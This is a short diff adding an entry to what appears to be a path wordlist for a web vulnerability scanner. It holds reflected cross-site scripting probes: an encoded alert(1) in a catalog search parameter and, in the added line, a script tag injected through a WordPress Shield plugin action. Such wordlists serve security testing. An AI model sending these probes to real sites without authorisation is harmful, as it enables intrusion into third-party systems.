@@ -822,3 +822,4 @@
 /admin/
 /wp-content/plugins/wp-content-permission/readme.txt
 /srv/eng/catalog.search?uiconfig=%28alert%281%29%2C%7B%7D%29
+/?action=shield_action&ex=display_full_page_dynamic&render_slug=render_shield_wploginreplica_header&title=nuclei&message=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
